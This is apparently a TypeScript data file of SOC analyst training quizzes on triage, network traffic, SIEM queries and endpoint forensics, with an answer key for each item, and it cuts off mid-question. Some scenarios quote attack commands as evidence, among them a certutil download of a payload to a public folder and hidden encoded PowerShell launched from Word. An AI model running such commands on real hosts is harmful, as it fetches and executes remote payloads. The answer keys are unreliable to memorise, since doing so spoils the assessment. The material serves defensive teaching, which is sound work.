import type { QuizData } from "@/data/quizData";

export const sapPart1: QuizData[] = [
  {
    quizId: "sap-q1",
    courseId: "soc-analyst-path",
    title: "SOC Analyst Foundations Quiz",
    description: "Scenario-driven assessment of the SOC analyst role, maturity models, compliance drivers, tooling, communication, and SOC metrics.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      {
        id: "sap-q1-1",
        difficulty: "easy",
        tags: ["SOC Roles", "Triage"],
        scenario: "06:55 — Shift start. Your queue holds 42 open alerts: 3 critical (EDR ransomware canary), 9 high (failed MFA bursts), 30 informational (expired certificates). Your SLA is 15 minutes to acknowledge critical alerts.",
        question: "What is the correct first action as the Tier 1 analyst on duty?",
        options: [
          "Clear the 30 informational alerts first so the queue looks manageable",
          "Acknowledge and begin triage on the 3 EDR ransomware canary alerts",
          "Email the SOC manager for permission before touching critical alerts",
          "Start with the MFA bursts because authentication events are more common"
        ],
        correctAnswer: 1,
        explanation: "Triage is risk-ordered, not volume-ordered. Ransomware canary hits carry the highest potential business impact and have the tightest SLA. Informational noise is handled after critical work or via tuning."
      },
      {
        id: "sap-q1-2",
        difficulty: "medium",
        tags: ["Escalation", "Tier Model"],
        scenario: "You confirm a workstation executed `rundll32.exe` loading a DLL from `C:\\Users\\Public\\`. The host is still online and the user is active. Your runbook covers triage but not containment authority.",
        question: "What should you do next?",
        options: [
          "Isolate the host yourself and document it afterwards",
          "Escalate to Tier 2 with your evidence and recommend host isolation",
          "Ask the user to reboot the machine to clear the malicious process",
          "Close the alert as informational because rundll32 is a signed Windows binary"
        ],
        correctAnswer: 1,
        explanation: "Tier 1 triages and escalates with evidence; containment actions that exceed documented authority belong to Tier 2/IR. Rebooting destroys volatile evidence, and signed-binary abuse (LOLBin) is not a reason to close."
      },
      {
        id: "sap-q1-3",
        difficulty: "medium",
        tags: ["Shift Handover"],
        scenario: "Ten minutes before handover you are mid-investigation on a suspected credential-stuffing campaign. Three IPs are blocked, one account is under review, and you have not yet checked whether any login succeeded.",
        question: "What must the handover note contain to be considered complete?",
        options: [
          "Only the alert IDs — the next analyst can re-read the tickets",
          "Current status, actions already taken, open questions, and the explicit next step",
          "A statement that the incident is closed to avoid duplicating work",
          "A screenshot of the SIEM dashboard with no written context"
        ],
        correctAnswer: 1,
        explanation: "A usable handover conveys state, actions, unknowns and the concrete next task so the incoming analyst resumes without re-investigating from scratch."
      },
      {
        id: "sap-q1-4",
        difficulty: "easy",
        tags: ["SOC Maturity"],
        scenario: "A SOC responds only when alerts fire, has no documented playbooks, and relies on two senior analysts' tribal knowledge. Detection content is never reviewed.",
        question: "Which maturity level best describes this SOC?",
        options: [
          "Level 1 — Initial/reactive, dependent on individuals",
          "Level 3 — Defined, with documented and repeatable processes",
          "Level 4 — Managed, with measured performance",
          "Level 5 — Optimising, with continuous improvement"
        ],
        correctAnswer: 0,
        explanation: "Undocumented, person-dependent, purely reactive operations are the textbook definition of an Initial (Level 1) SOC. Documentation moves it towards Repeatable/Defined."
      },
      {
        id: "sap-q1-5",
        difficulty: "medium",
        tags: ["SOC Maturity", "Metrics"],
        scenario: "Your SOC has playbooks for every alert type, tracks MTTD/MTTR weekly, and publishes dashboards — but no one uses those metrics to change detection content or staffing.",
        question: "Where is this SOC stalled?",
        options: [
          "Between Level 1 and 2 — processes are not repeatable",
          "Between Level 4 and 5 — measured but not driving improvement",
          "At Level 5 — publishing metrics is the definition of optimising",
          "At Level 2 — playbooks alone imply no measurement"
        ],
        correctAnswer: 1,
        explanation: "Measurement without feedback into process is the classic Managed (4) plateau. Optimising (5) requires metrics to demonstrably drive change."
      },
      {
        id: "sap-q1-6",
        difficulty: "medium",
        tags: ["Compliance", "PCI-DSS"],
        scenario: "A retailer stores cardholder data in a segmented network. Auditors ask how long the SOC keeps logs from the cardholder data environment and how often they are reviewed.",
        question: "Which requirement pair applies under PCI-DSS?",
        options: [
          "Retain logs 30 days total; review annually",
          "Retain 12 months with at least 3 months immediately available; review daily",
          "Retain 7 years; review quarterly",
          "No retention requirement as long as a SIEM exists"
        ],
        correctAnswer: 1,
        explanation: "PCI-DSS requires one year of audit log retention with three months readily available for analysis, plus daily review of security events for in-scope systems."
      },
      {
        id: "sap-q1-7",
        difficulty: "medium",
        tags: ["Compliance", "GDPR"],
        scenario: "At 09:00 Monday you confirm that an exposed API leaked EU customer names and email addresses. Legal asks about notification timing.",
        question: "What is the GDPR obligation for the supervisory authority?",
        options: [
          "Notify within 72 hours of becoming aware of the breach",
          "Notify within 30 calendar days",
          "Notify only if more than 10,000 records are involved",
          "No notification is needed for names and email addresses"
        ],
        correctAnswer: 0,
        explanation: "GDPR Article 33 requires notification to the supervisory authority without undue delay and, where feasible, within 72 hours of awareness. Names and emails are personal data."
      },
      {
        id: "sap-q1-8",
        difficulty: "easy",
        tags: ["Compliance", "HIPAA"],
        scenario: "A hospital SOC monitors a system that stores patient diagnoses and treatment records.",
        question: "Which data classification and framework applies?",
        options: [
          "PHI under HIPAA",
          "PII under SOX",
          "Cardholder data under PCI-DSS",
          "Trade secrets under GDPR"
        ],
        correctAnswer: 0,
        explanation: "Health data tied to an individual is Protected Health Information, governed in the US by HIPAA's Security and Breach Notification Rules."
      },
      {
        id: "sap-q1-9",
        difficulty: "medium",
        tags: ["Toolkit", "Enrichment"],
        scenario: "You receive a suspicious IP `198.51.100.77` seen in outbound traffic from three hosts. You must enrich it without alerting the adversary.",
        question: "Which approach preserves operational security?",
        options: [
          "Run a full nmap scan against the IP from a corporate host",
          "Use passive sources first: passive DNS, threat intel feeds, and existing internal telemetry",
          "Visit the IP in a browser from your analyst workstation",
          "Send an email to the IP's abuse contact asking who owns it"
        ],
        correctAnswer: 1,
        explanation: "Active interaction tips off the adversary and can be attributed back to your organisation. Start passive: pDNS, reputation feeds, WHOIS caches and your own logs."
      },
      {
        id: "sap-q1-10",
        difficulty: "easy",
        tags: ["Toolkit"],
        scenario: "You must safely detonate a suspicious Office attachment while capturing behaviour and network callbacks.",
        question: "Which environment is appropriate?",
        options: [
          "Your analyst workstation with antivirus enabled",
          "An isolated sandbox VM with snapshotting and simulated internet",
          "A production file server used for testing",
          "A colleague's laptop that has no sensitive data"
        ],
        correctAnswer: 1,
        explanation: "Detonation requires an isolated, revertible sandbox with network simulation (INetSim/FakeNet) so the sample runs without endangering production or leaking to real C2."
      },
      {
        id: "sap-q1-11",
        difficulty: "medium",
        tags: ["Communication"],
        scenario: "The CFO asks in a bridge call: 'Are we hacked? Should I tell the board?' You have confirmed a single workstation with commodity adware and no lateral movement evidence.",
        question: "What is the best response?",
        options: [
          "'We're compromised, assume the worst' — better safe than sorry",
          "State the confirmed facts, the current scope, the unknowns, and the next update time",
          "'Nothing to worry about, it's all clear' before the investigation closes",
          "Forward the raw EDR logs and let the CFO decide"
        ],
        correctAnswer: 1,
        explanation: "Executive communication is fact-bounded: what is confirmed, what is scoped, what remains unknown, and when the next update arrives. Neither alarmism nor premature all-clears are acceptable."
      },
      {
        id: "sap-q1-12",
        difficulty: "medium",
        tags: ["Communication", "Stakeholders"],
        scenario: "Containment requires disabling a shared service account that runs nightly billing jobs.",
        question: "Who must be engaged before the action, and why?",
        options: [
          "No one — containment always overrides availability",
          "The business/application owner, to weigh compromise risk against billing outage",
          "Only the SOC manager, since it is a security decision",
          "The end users, by broadcast email"
        ],
        correctAnswer: 1,
        explanation: "Containment actions with business impact require the asset/business owner's input (or documented emergency authority). Security decisions are made with, not around, the business."
      },
      {
        id: "sap-q1-13",
        difficulty: "hard",
        tags: ["Metrics", "MTTD/MTTR"],
        scenario: "Timeline: initial compromise 01:00, first alert generated 01:12, analyst acknowledged 01:35, containment complete 03:05.",
        question: "What are MTTD, MTTA and MTTR for this incident?",
        options: [
          "MTTD 12 min, MTTA 23 min, MTTR 2h 05m from detection",
          "MTTD 35 min, MTTA 12 min, MTTR 1h 30m",
          "MTTD 23 min, MTTA 35 min, MTTR 3h 05m",
          "MTTD 12 min, MTTA 35 min, MTTR 12 min"
        ],
        correctAnswer: 0,
        explanation: "Detection is compromise→alert (12 min). Acknowledgement is alert→analyst pickup (23 min). Response/resolution is measured from detection to containment (01:12→03:05 = 1h53m, commonly reported as ~2 hours)."
      },
      {
        id: "sap-q1-14",
        difficulty: "medium",
        tags: ["Metrics", "Tuning"],
        scenario: "A single correlation rule produces 61% of your monthly alert volume with a 99% false-positive rate. Analysts now auto-close it without review.",
        question: "What is the correct remediation?",
        options: [
          "Keep it as-is; high volume proves the detection is working",
          "Tune or rewrite the rule with enrichment and thresholds, tracking FP rate before/after",
          "Delete all logs feeding the rule",
          "Instruct analysts to keep auto-closing to protect MTTR numbers"
        ],
        correctAnswer: 1,
        explanation: "Alert fatigue from a 99% FP rule is a detection-engineering defect. Tune with context/thresholds and measure the FP rate change; auto-closing hides real detections."
      },
      {
        id: "sap-q1-15",
        difficulty: "hard",
        tags: ["Metrics", "Reporting"],
        scenario: "The board asks for one slide showing whether SOC investment last quarter paid off.",
        question: "Which metric set is most defensible?",
        options: [
          "Total alerts processed and number of tickets closed",
          "MTTD/MTTR trend, detection coverage against ATT&CK, and incidents contained before impact",
          "Number of tools purchased and licences deployed",
          "Analyst hours worked and overtime totals"
        ],
        correctAnswer: 1,
        explanation: "Board-level value is outcome-based: faster detection/response, broader validated coverage, and incidents stopped before business impact. Volume and tool counts are activity metrics, not outcomes."
      }
    ]
  },
  {
    quizId: "sap-q2",
    courseId: "soc-analyst-path",
    title: "Network Traffic Analysis Quiz",
    description: "TCP/IP behaviour, DNS threats, HTTP/TLS investigation, Wireshark filtering, and Zeek flow analysis in realistic SOC scenarios.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      {
        id: "sap-q2-1",
        difficulty: "medium",
        tags: ["TCP/IP", "Recon"],
        scenario: "Zeek conn.log shows 4,900 connections from 10.10.4.9 to 10.10.9.0/24 in 40 seconds. Almost all have history 'S' and duration 0.000, with a handful showing 'ShADadFf'.",
        question: "What activity is this, and what do the two history patterns mean?",
        options: [
          "Normal backup traffic; 'S' means success",
          "A TCP SYN scan — 'S' is a SYN with no reply (filtered/closed), 'ShADadFf' is a completed session on an open port",
          "A DDoS attack against 10.10.4.9",
          "DNS zone transfer activity"
        ],
        correctAnswer: 1,
        explanation: "High-fan-out, zero-duration SYN-only connections across a /24 is horizontal scanning. Zeek history letters record the handshake: lone 'S' means no response; 'ShADadFf' is a full open/close session."
      },
      {
        id: "sap-q2-2",
        difficulty: "medium",
        tags: ["TCP/IP"],
        scenario: "A packet capture shows a client sending SYN, the server replying RST/ACK immediately.",
        question: "What does this indicate?",
        options: [
          "The port is open and listening",
          "The port is closed on the destination host",
          "A firewall silently dropped the packet",
          "The three-way handshake completed successfully"
        ],
        correctAnswer: 1,
        explanation: "RST/ACK in response to SYN means the host is reachable but nothing is listening — a closed port. Silent drops (no response) indicate filtering."
      },
      {
        id: "sap-q2-3",
        difficulty: "hard",
        tags: ["DNS", "Exfiltration", "T1071.004"],
        scenario: "dns.log: 8,200 TXT queries in 20 minutes from one host, all subdomains of `cdn-sync.io`, labels ~55 chars of mixed-case base32, NXDOMAIN rate near zero, average query size 240 bytes.",
        question: "What is the most likely activity?",
        options: [
          "DGA malware searching for a live C2 domain",
          "DNS tunnelling used for C2/exfiltration over TXT records",
          "A misconfigured DNS resolver retry loop",
          "Fast-flux hosting of a phishing site"
        ],
        correctAnswer: 1,
        explanation: "High-entropy long labels under a single registered domain, TXT record type, high volume and low NXDOMAIN is tunnelling — not DGA, which produces many distinct domains and heavy NXDOMAIN."
      },
      {
        id: "sap-q2-4",
        difficulty: "medium",
        tags: ["DNS", "DGA"],
        scenario: "An endpoint resolves 300 random-looking domains across 12 TLDs in five minutes; 297 return NXDOMAIN and 3 resolve to the same hosting IP.",
        question: "What does this pattern indicate?",
        options: [
          "DNS tunnelling",
          "Domain generation algorithm beaconing to find a live C2",
          "Normal browser prefetching",
          "A DNS cache poisoning attempt"
        ],
        correctAnswer: 1,
        explanation: "Mass NXDOMAIN across generated names with a few live hits is classic DGA behaviour: the malware iterates candidate domains until it reaches the registered one."
      },
      {
        id: "sap-q2-5",
        difficulty: "medium",
        tags: ["DNS", "Fast-flux"],
        scenario: "A domain returns a different set of five A records every 120 seconds, all with TTL 60, spread across residential ASNs in nine countries.",
        question: "What technique is in use?",
        options: [
          "Fast-flux DNS to keep malicious infrastructure resilient",
          "Standard CDN load balancing",
          "DNSSEC key rollover",
          "Round-robin corporate failover"
        ],
        correctAnswer: 0,
        explanation: "Very low TTLs with rapidly rotating IPs across unrelated residential ASNs is fast-flux — legitimate CDNs use consistent, provider-owned ranges."
      },
      {
        id: "sap-q2-6",
        difficulty: "hard",
        tags: ["HTTP", "Beaconing"],
        scenario: "http.log shows requests to `/api/v2/status` every 60s ± 3s for 14 hours, user_agent `Mozilla/4.0 (compatible; MSIE 6.0)`, response size constant 312 bytes, method GET.",
        question: "Which characteristic is the strongest indicator of C2 beaconing?",
        options: [
          "The URI path contains 'api'",
          "Highly regular interval with low jitter plus constant response size",
          "Use of HTTP instead of HTTPS",
          "The destination port is 80"
        ],
        correctAnswer: 1,
        explanation: "Machine-like periodicity with minimal jitter and near-constant payload sizes is the signature of automated beaconing; the obsolete UA is corroborating, not primary, evidence."
      },
      {
        id: "sap-q2-7",
        difficulty: "medium",
        tags: ["HTTP", "Exfiltration"],
        scenario: "A workstation issues 40 HTTP POSTs to an unknown domain, each ~9 MB, over 25 minutes. Inbound bytes total under 20 KB.",
        question: "What does the byte ratio tell you?",
        options: [
          "Normal software update download",
          "Likely data exfiltration — outbound volume vastly exceeds inbound",
          "A denial-of-service attack on the workstation",
          "Encrypted VPN tunnel establishment"
        ],
        correctAnswer: 1,
        explanation: "Updates and browsing are inbound-heavy. Sustained large outbound POSTs with negligible responses inverts the normal ratio and indicates staged exfiltration."
      },
      {
        id: "sap-q2-8",
        difficulty: "medium",
        tags: ["Wireshark"],
        scenario: "You must isolate only HTTP POST requests to host 203.0.113.20 inside a 3 GB capture.",
        question: "Which Wireshark display filter is correct?",
        options: [
          "http.request.method == \"POST\" && ip.addr == 203.0.113.20",
          "tcp.port = 80 or POST",
          "http contains POST and 203.0.113.20",
          "ip.src eq 203.0.113.20 / http.post"
        ],
        correctAnswer: 0,
        explanation: "Wireshark display filters use field names with `==` and `&&`. `http.request.method == \"POST\" && ip.addr == 203.0.113.20` is the valid syntax."
      },
      {
        id: "sap-q2-9",
        difficulty: "easy",
        tags: ["Wireshark"],
        scenario: "You need to read the full application-layer conversation of one TCP session, reassembled in order.",
        question: "Which Wireshark feature do you use?",
        options: [
          "Follow → TCP Stream",
          "Statistics → Protocol Hierarchy",
          "Capture Filter",
          "Expert Information"
        ],
        correctAnswer: 0,
        explanation: "Follow TCP Stream reassembles both directions of a session into readable order; the other options summarise or filter but do not reassemble payloads."
      },
      {
        id: "sap-q2-10",
        difficulty: "hard",
        tags: ["TLS", "JA3"],
        scenario: "ssl.log shows a session to a rare IP with SNI `updates-microsoft.co`, self-signed certificate, validity 30 days, and JA3 hash matching a known Cobalt Strike profile.",
        question: "Which finding most strongly supports a malicious verdict?",
        options: [
          "The SNI resembles a Microsoft domain",
          "The JA3 client fingerprint matches a known offensive tooling profile",
          "TLS is being used at all",
          "The certificate is valid for 30 days"
        ],
        correctAnswer: 1,
        explanation: "JA3 fingerprints the client's TLS handshake parameters, identifying the implementation regardless of destination. A tooling match is far stronger than typosquat naming alone."
      },
      {
        id: "sap-q2-11",
        difficulty: "medium",
        tags: ["TLS"],
        scenario: "Management asks why the SOC can still detect threats after the estate moved to TLS 1.3 without interception.",
        question: "Which metadata remains available for detection?",
        options: [
          "Full HTTP request bodies",
          "Connection tuples, timing/volume patterns, JA3/JA4 fingerprints, and certificate/SNI data where present",
          "Decrypted credentials",
          "Nothing — TLS 1.3 makes network monitoring impossible"
        ],
        correctAnswer: 1,
        explanation: "Encryption hides payloads, not behaviour. Flow metadata, periodicity, byte ratios and handshake fingerprints still drive high-quality detections."
      },
      {
        id: "sap-q2-12",
        difficulty: "medium",
        tags: ["Zeek", "Pivoting"],
        scenario: "You have a suspicious file hash in files.log and need every related connection, DNS lookup and HTTP request.",
        question: "Which Zeek field lets you pivot across logs for the same session?",
        options: [
          "The `uid` connection identifier",
          "The `ts` timestamp field",
          "The `proto` field",
          "The `conn_state` field"
        ],
        correctAnswer: 0,
        explanation: "Zeek stamps every log entry belonging to a connection with the same `uid`, making it the canonical pivot key across conn, dns, http, ssl and files logs."
      },
      {
        id: "sap-q2-13",
        difficulty: "medium",
        tags: ["Zeek", "Detection"],
        scenario: "conn.log entry: `duration=41203.5 orig_bytes=88214 resp_bytes=91002 service=ssl id.resp_p=443 id.resp_h=45.9.x.x`.",
        question: "Why is this connection worth investigating?",
        options: [
          "Port 443 traffic is always suspicious",
          "An 11-hour low-and-slow session to an uncommon host with small balanced byte counts suggests a persistent tunnel",
          "The connection transferred too much data",
          "SSL service means the certificate is invalid"
        ],
        correctAnswer: 1,
        explanation: "Long-lived sessions with modest, balanced traffic to rare destinations are characteristic of interactive C2 or tunnels rather than normal browsing bursts."
      },
      {
        id: "sap-q2-14",
        difficulty: "medium",
        tags: ["Sensor Placement"],
        scenario: "Your NSM sensor is missing east-west lateral movement between VLANs but sees all internet traffic.",
        question: "What is the likely cause?",
        options: [
          "The sensor is at the internet egress only, with no visibility into internal switching",
          "Zeek does not support internal traffic",
          "The sensor is running with too much disk space",
          "Lateral movement never traverses the network"
        ],
        correctAnswer: 0,
        explanation: "A perimeter-only tap sees north-south traffic. East-west visibility requires internal TAPs/SPANs at distribution switches or virtual taps in the hypervisor."
      },
      {
        id: "sap-q2-15",
        difficulty: "hard",
        tags: ["ICMP", "Covert Channel"],
        scenario: "ICMP echo requests leave one server every 2 seconds with 1,024-byte payloads containing high-entropy data; replies carry different payloads of similar size.",
        question: "What is happening?",
        options: [
          "Standard ping monitoring by the NOC",
          "An ICMP covert channel used for C2 or exfiltration",
          "Path MTU discovery",
          "A misconfigured load balancer health check"
        ],
        correctAnswer: 1,
        explanation: "Legitimate pings use small, static, low-entropy payloads. Large, varying, high-entropy ICMP payloads in both directions indicate data smuggling inside ICMP."
      }
    ]
  },
  {
    quizId: "sap-q3",
    courseId: "soc-analyst-path",
    title: "SIEM Mastery Assessment",
    description: "Query writing, correlation rule design, dashboards, log onboarding, tuning and use-case development under realistic SOC pressure.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
      {
        id: "sap-q3-1",
        difficulty: "medium",
        tags: ["Splunk", "SPL"],
        scenario: "You must find accounts with more than 20 failed logons followed by one success within 10 minutes.",
        question: "Which SPL pattern is appropriate?",
        options: [
          "`index=wineventlog | stats count by user` only",
          "`... | bin _time span=10m | stats count(eval(action=\"failure\")) as fails count(eval(action=\"success\")) as wins by user,_time | where fails>20 AND wins>0`",
          "`index=wineventlog EventCode=4625 | head 20`",
          "`| rest /services/authentication`"
        ],
        correctAnswer: 1,
        explanation: "Time-bucketing with conditional counts per user detects the failure-burst-then-success pattern; a raw count or head-limited search cannot express the sequence."
      },
      {
        id: "sap-q3-2",
        difficulty: "hard",
        tags: ["Splunk", "Performance"],
        scenario: "A dashboard panel searching 90 days of firewall data times out repeatedly.",
        question: "What is the most effective optimisation?",
        options: [
          "Use `tstats` against accelerated data models instead of raw event search",
          "Add `| sort 0 -_time` to the end",
          "Increase the browser timeout",
          "Search all indexes with `index=*` to help the scheduler"
        ],
        correctAnswer: 0,
        explanation: "`tstats` queries indexed/accelerated summaries rather than scanning raw events, giving order-of-magnitude speedups. Sorting and wildcard indexes make it worse."
      },
      {
        id: "sap-q3-3",
        difficulty: "medium",
        tags: ["KQL", "Sentinel"],
        scenario: "In Microsoft Sentinel you need sign-ins from two countries for the same user within one hour.",
        question: "Which KQL construct fits best?",
        options: [
          "`SigninLogs | summarize dcount(Location) by UserPrincipalName, bin(TimeGenerated, 1h) | where dcount_Location > 1`",
          "`SigninLogs | take 100`",
          "`SigninLogs | project TimeGenerated`",
          "`SigninLogs | where ResultType == 0 | count`"
        ],
        correctAnswer: 0,
        explanation: "Distinct-count of locations per user per time bin surfaces impossible-travel candidates; the other queries do no aggregation."
      },
      {
        id: "sap-q3-4",
        difficulty: "medium",
        tags: ["Correlation"],
        scenario: "You are designing a rule for 'successful brute force followed by lateral movement'.",
        question: "What makes this a correlation rule rather than a simple detection?",
        options: [
          "It uses a regular expression",
          "It joins events from different sources/time windows into one causal chain",
          "It runs on a schedule",
          "It sends an email"
        ],
        correctAnswer: 1,
        explanation: "Correlation links multiple event types (authentication then remote-service usage) across time and sources; single-source threshold rules do not model the chain."
      },
      {
        id: "sap-q3-5",
        difficulty: "hard",
        tags: ["Correlation", "False Positives"],
        scenario: "Your new correlation rule fires 400 times a day; 380 are vulnerability scanners and backup service accounts.",
        question: "What is the best tuning approach?",
        options: [
          "Lower the severity so analysts ignore it",
          "Add asset-context exclusions for known scanners and service accounts, maintained as a versioned lookup",
          "Delete the rule",
          "Whitelist the entire subnet permanently in the rule text"
        ],
        correctAnswer: 1,
        explanation: "Enrichment-driven exclusions held in a maintained lookup keep the detection intact and auditable. Hard-coded broad subnet whitelists and severity suppression create blind spots."
      },
      {
        id: "sap-q3-6",
        difficulty: "medium",
        tags: ["Normalization", "CIM"],
        scenario: "Three firewall vendors log the source IP as `src_ip`, `srcaddr`, and `source.ip`. Your rules only match one of them.",
        question: "What is the correct fix?",
        options: [
          "Write three copies of every detection rule",
          "Normalise all sources to a common schema (CIM/ASIM/ECS) at ingest, then write one rule",
          "Ask the vendors to change their log formats",
          "Drop two of the three firewall feeds"
        ],
        correctAnswer: 1,
        explanation: "Field normalisation at ingest is what makes vendor-agnostic detection possible; duplicating rules per vendor is unmaintainable."
      },
      {
        id: "sap-q3-7",
        difficulty: "medium",
        tags: ["Onboarding"],
        scenario: "A new log source is onboarded. Events arrive but timestamps are eight hours off and events appear 'in the future'.",
        question: "What should you check first?",
        options: [
          "The SIEM licence volume",
          "Time zone configuration and NTP sync on the source and the parser's TZ handling",
          "The analyst's browser locale",
          "The dashboard refresh interval"
        ],
        correctAnswer: 1,
        explanation: "Timestamp skew almost always traces to missing/incorrect time-zone metadata or unsynchronised clocks; skewed time breaks correlation and forensic timelines."
      },
      {
        id: "sap-q3-8",
        difficulty: "medium",
        tags: ["Onboarding", "Validation"],
        scenario: "After onboarding a new EDR feed you must prove detections will work.",
        question: "What is the correct validation step?",
        options: [
          "Confirm events are arriving and stop there",
          "Generate known-benign test telemetry (e.g. Atomic Red Team) and confirm parsing, field mapping and rule firing end-to-end",
          "Wait for a real incident to test it",
          "Trust the vendor's documentation"
        ],
        correctAnswer: 1,
        explanation: "Ingest is necessary but not sufficient. Controlled technique execution validates parsing, normalisation and rule logic before you depend on the source."
      },
      {
        id: "sap-q3-9",
        difficulty: "easy",
        tags: ["Dashboards"],
        scenario: "You are building the primary SOC wall dashboard.",
        question: "What should it prioritise?",
        options: [
          "Actionable state: open critical alerts, SLA breaches, ingest health, and top affected assets",
          "Total events per second as the largest panel",
          "A world map of all traffic for visual impact",
          "A pie chart of log source vendors"
        ],
        correctAnswer: 0,
        explanation: "Operational dashboards must drive decisions: what needs attention now, what is breaching SLA, and whether the data pipeline is healthy."
      },
      {
        id: "sap-q3-10",
        difficulty: "hard",
        tags: ["Detection Gaps"],
        scenario: "Ingest health shows a critical domain controller stopped sending Security events 26 hours ago; nobody noticed.",
        question: "Which control prevents this class of blind spot?",
        options: [
          "A log-source heartbeat/stale-feed alert with per-source expected volume baselines",
          "Increasing retention",
          "Adding more correlation rules",
          "Weekly manual review of the source list"
        ],
        correctAnswer: 0,
        explanation: "Silent-source detection (heartbeat plus volume baselining) is a mandatory SIEM control — missing telemetry is invisible to every other detection."
      },
      {
        id: "sap-q3-11",
        difficulty: "medium",
        tags: ["Use Cases", "ATT&CK"],
        scenario: "You are asked to create detection use cases for the coming quarter with limited engineering time.",
        question: "How should you prioritise?",
        options: [
          "Alphabetically by ATT&CK technique ID",
          "By threat-model relevance: techniques used by actors targeting your sector, weighted by available telemetry and asset criticality",
          "By whichever rules are easiest to write",
          "By the number of alerts each rule will generate"
        ],
        correctAnswer: 1,
        explanation: "Use-case development is risk-driven: relevant adversary behaviour, crown-jewel assets, and the telemetry you actually collect determine value."
      },
      {
        id: "sap-q3-12",
        difficulty: "medium",
        tags: ["Sigma"],
        scenario: "Your organisation runs Splunk today and is piloting Sentinel.",
        question: "Why author detections in Sigma first?",
        options: [
          "Sigma runs faster than native queries",
          "Sigma is a vendor-neutral rule format that converts to multiple backends, protecting detection content from platform lock-in",
          "Sigma replaces the SIEM",
          "Sigma automatically tunes false positives"
        ],
        correctAnswer: 1,
        explanation: "Sigma is a portable detection description language; rules convert to SPL, KQL and others, so migrating platforms does not mean rewriting the detection library."
      },
      {
        id: "sap-q3-13",
        difficulty: "hard",
        tags: ["Alert Quality"],
        scenario: "An alert fires with only: 'Suspicious activity detected on host WKS-221'.",
        question: "What is missing for effective Tier 1 triage?",
        options: [
          "Nothing — the analyst can search the SIEM",
          "Triage context: the triggering evidence, user/asset criticality, ATT&CK mapping, and the runbook link",
          "A louder notification sound",
          "A higher severity label"
        ],
        correctAnswer: 1,
        explanation: "Alert payloads should carry the evidence and context needed to decide quickly; forcing every analyst to reconstruct context inflates MTTR and drives inconsistent decisions."
      },
      {
        id: "sap-q3-14",
        difficulty: "medium",
        tags: ["Suppression"],
        scenario: "A patching window generates 5,000 service-installation alerts every Tuesday 02:00–04:00.",
        question: "What is the correct handling?",
        options: [
          "A documented, time-boxed and expiring suppression tied to the change record, with post-window review",
          "Permanent suppression of all service-installation events",
          "Turning the SIEM off during the window",
          "Auto-closing every Tuesday alert forever"
        ],
        correctAnswer: 0,
        explanation: "Suppression must be scoped, time-boxed, tied to an approved change, and reviewed — otherwise attackers simply operate inside the maintenance window."
      },
      {
        id: "sap-q3-15",
        difficulty: "medium",
        tags: ["Lookups", "Enrichment"],
        scenario: "You want alerts to show whether the affected host is a domain controller, a jump box, or a kiosk.",
        question: "How is this best implemented?",
        options: [
          "Ask the analyst to check the CMDB manually every time",
          "Enrich at alert time from an asset-criticality lookup fed by the CMDB",
          "Encode criticality in the hostname only",
          "Create separate rules per host"
        ],
        correctAnswer: 1,
        explanation: "Automated asset enrichment attaches criticality to every alert, enabling consistent prioritisation without manual lookups."
      }
    ]
  },
  {
    quizId: "sap-q4",
    courseId: "soc-analyst-path",
    title: "Endpoint Investigation Quiz",
    description: "Windows process forensics, persistence, Linux triage, memory analysis, browser artefacts and PowerShell logging.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      {
        id: "sap-q4-1",
        difficulty: "medium",
        tags: ["Windows", "T1566.001"],
        scenario: "Sysmon Event ID 1:\nParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine: powershell -nop -w hidden -enc SQBFAFgA...",
        question: "What is the correct assessment?",
        options: [
          "Benign — PowerShell is a signed Microsoft binary",
          "Malicious execution chain: Office spawning hidden encoded PowerShell indicates macro-based initial access",
          "A Windows Update process",
          "Normal behaviour for Office add-ins"
        ],
        correctAnswer: 1,
        explanation: "Word should not spawn PowerShell. `-nop -w hidden -enc` is the canonical maldoc launcher pattern and warrants immediate escalation and host isolation."
      },
      {
        id: "sap-q4-2",
        difficulty: "hard",
        tags: ["Process Injection", "T1055"],
        scenario: "`svchost.exe` is running with parent `explorer.exe`, no `-k` service group argument, and has an RWX private memory region containing PE headers.",
        question: "What does this indicate?",
        options: [
          "Normal service host behaviour",
          "Process masquerading/injection — legitimate svchost is spawned by services.exe with a -k flag",
          "A Windows licensing check",
          "A memory leak in Explorer"
        ],
        correctAnswer: 1,
        explanation: "Genuine svchost.exe is launched by services.exe with `-k <group>`. An explorer-parented svchost with RWX PE-bearing memory is masquerading plus injected code."
      },
      {
        id: "sap-q4-3",
        difficulty: "medium",
        tags: ["LOLBin", "T1218"],
        scenario: "Command line observed: `certutil.exe -urlcache -split -f http://198.51.100.9/a.txt C:\\Users\\Public\\a.exe`",
        question: "What is happening?",
        options: [
          "Certificate revocation list update",
          "LOLBin abuse — certutil used to download a remote payload",
          "Windows Defender signature update",
          "A benign scripted certificate install"
        ],
        correctAnswer: 1,
        explanation: "`certutil -urlcache -split -f` is a well-known download cradle abusing a signed binary (T1105/T1218) to fetch payloads while evading naive allowlists."
      },
      {
        id: "sap-q4-4",
        difficulty: "medium",
        tags: ["Persistence", "T1547.001"],
        scenario: "You must enumerate autostart persistence on a suspect Windows host.",
        question: "Which set of locations covers the most common mechanisms?",
        options: [
          "Only the Startup folder",
          "Run/RunOnce keys, Scheduled Tasks, Services, WMI event subscriptions, and Startup folders",
          "Only Windows Services",
          "The hosts file and DNS cache"
        ],
        correctAnswer: 1,
        explanation: "Comprehensive persistence triage must cover registry autoruns, tasks, services, WMI subscriptions and startup folders — attackers rotate among them."
      },
      {
        id: "sap-q4-5",
        difficulty: "hard",
        tags: ["Persistence", "T1546.003"],
        scenario: "A `__EventFilter` bound to a `CommandLineEventConsumer` executes a PowerShell one-liner every 30 minutes, with no file on disk.",
        question: "Which persistence technique is this?",
        options: [
          "Scheduled task persistence",
          "WMI event subscription persistence — fileless and often missed by disk scans",
          "DLL search order hijacking",
          "Registry Run key persistence"
        ],
        correctAnswer: 1,
        explanation: "Filter-to-consumer bindings in the WMI repository provide fileless, reboot-surviving persistence (T1546.003); detection requires WMI-Activity/Sysmon Event IDs 19-21."
      },
      {
        id: "sap-q4-6",
        difficulty: "medium",
        tags: ["Linux"],
        scenario: "On a compromised Linux server you must list current network connections with owning processes and check for hidden persistence.",
        question: "Which command set is most appropriate?",
        options: [
